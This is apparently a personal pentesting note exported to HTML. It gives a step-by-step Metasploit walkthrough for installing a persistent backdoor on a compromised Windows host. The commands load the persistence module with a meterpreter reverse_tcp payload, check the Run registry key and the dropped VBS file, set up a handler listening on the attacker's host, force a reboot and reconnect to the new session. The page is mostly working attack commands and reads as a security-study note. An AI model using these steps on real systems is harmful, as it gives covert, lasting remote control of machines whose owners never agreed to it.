<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>backdoor with metasploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>backdoor with metasploit</h1><br/><strong><h2>Backdoor</h2></strong><br />1. On metasploit we search for a persistence backdoor exploit<br />    <div class="codebox"><pre>search persistence</pre></div><br />    <a href=""><img src="images/866-1.png" alt="images/866-1.png" /></a><br />2. <div class="codebox"><pre>use exploit/windows/local/persistence</pre></div><br />    <a href=""><img src="images/866-2.png" alt="images/866-2.png" /></a><br />    *instead with &quot;post/windows/manage/persistence_exe&quot; we have to upload our executable backdoor<br />3. set payload<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD payload<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp</pre></div><br />    <a href=""><img src="images/866-3.png" alt="images/866-3.png" /></a><br />4. <div class="codebox"><pre>show options</pre></div><br />    <a href=""><img src="images/866-4.png" alt="images/866-4.png" /></a><br />5. <div class="codebox"><pre>run</pre></div><br />    <a href=""><img src="images/866-5.png" alt="images/866-5.png" /></a><br />6. Now we can check if the changes are been done<br />    <div class="codebox"><pre>meterpreter &gt; reg queryval -k HKCU<span style="color:#333333;font-weight:400">\\</span>Software<span style="color:#333333;font-weight:400">\\</span>Microsoft<span style="color:#333333;font-weight:400">\\</span>Windows<span style="color:#333333;font-weight:400">\\</span>CurrentVersion<span style="color:#333333;font-weight:400">\\</span>Run -v backdoor_registry</pre></div><br />    <a href=""><img src="images/866-6.png" alt="images/866-6.png" /></a><br />    <div class="codebox"><pre>meterpreter &gt; <span style="color:#ff9d00;font-weight:700">ls</span> C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\\</span>Windows<span style="color:#333333;font-weight:400">\\</span>TEMP<span style="color:#333333;font-weight:400">\\</span>bRMMdjDrlXHmR.vbs</pre></div><br />    <a href=""><img src="images/866-7.png" alt="images/866-7.png" /></a><br />7. Before restart the target machine you have to create a listener at the specific port<br />    <div class="codebox"><pre>msf &gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp <span style="color:#0088ff;font-weight:400">#same-payload-placed-in-the-victim-machine</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> lhost &lt;lhost&gt;                           <span style="color:#0088ff;font-weight:400">#attacker host</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> lport &lt;lport&gt;                           <span style="color:#0088ff;font-weight:400">#attacker listening</span><br />msf &gt; exploit -j                                  <span style="color:#0088ff;font-weight:400">#run module in the background</span></pre></div><br />8. Restart the remote Windows machine to make effective the backdoor. <br />    The active session will die(session 9) but we do not care because we will get a new session when the user will login to the machine (<span style="color:#00ff00;">session 11</span>)<br />    <div class="codebox"><pre>msf &gt; sessions -i &lt;Id-session&gt;<br />meterpreter &gt; shell<br />C:\Users\danie\Desktop&gt; shutdown /r /f</pre></div><br />    <a href=""><img src="images/866-8.png" alt="images/866-8.png" /></a><br />9. come back to metasploit and check for active sessions<br />    <div class="codebox"><pre>msf &gt; sessions<br />msf &gt; sessions -i &lt;ID-session&gt;</pre></div><br />    <a href=""><img src="images/866-9.png" alt="images/866-9.png" /></a><br /><br /><br /></div>
</body>
</html>
